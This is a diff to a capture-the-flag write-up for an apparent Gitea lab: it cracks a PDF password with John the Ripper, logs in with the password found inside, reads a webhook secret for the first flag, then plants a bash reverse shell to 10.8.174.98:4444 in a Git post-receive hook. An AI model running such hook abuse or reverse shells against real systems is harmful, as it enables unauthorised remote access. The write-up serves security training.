@@ -73,7 +73,9 @@ What if we decode it with base64?
 
 
 Apparently it's password protected. We will use **John The Ripper** for this one.
+
 `/usr/share/john/pdf2john.pl uninteresting_file.pdf > pdfhash.txt`
+
 The format to be used will be shown with this command:
 
 `john --list=formats | grep -i pdf`
@@ -88,8 +90,30 @@ And to crack the password of the file:
 
 ![image](https://user-images.githubusercontent.com/86648102/134908157-99295585-44ac-477e-9df5-f645867be2bb.png)
 
+Apply the password to the PDF file. Apparently, within there's a text that might look like a password...back to the Gitea, maybe **leeroy** with this password will work.
 
+![image](https://user-images.githubusercontent.com/86648102/134908865-171c7bc2-5dc8-4f62-adb3-2076da70b2e0.png)
 
+We are in!
+
+- Found a "secret" field under the Webhooks ( Repository > Settings > Webhooks )
+Right click to inspect the field and..you get the first flag.
+
+![image](https://user-images.githubusercontent.com/86648102/134909821-2a88084b-8fac-45a5-a87b-e0c457dbe74c.png)
+
+---
+### Flag 2
+
+Githooks abuse.
+
+![image](https://user-images.githubusercontent.com/86648102/134910069-93f8b126-1a15-4f17-9a03-aaf134cb341f.png)
+
+Edit the "post-receive" hook and add the following content:
+
+`#!/bin/bash
+bash -i >& /dev/tcp/10.8.174.98/4444 0>&1`
+
+![image](https://user-images.githubusercontent.com/86648102/134910323-c2859f53-3897-449b-ab14-f31e75317abb.png)
 
 
 
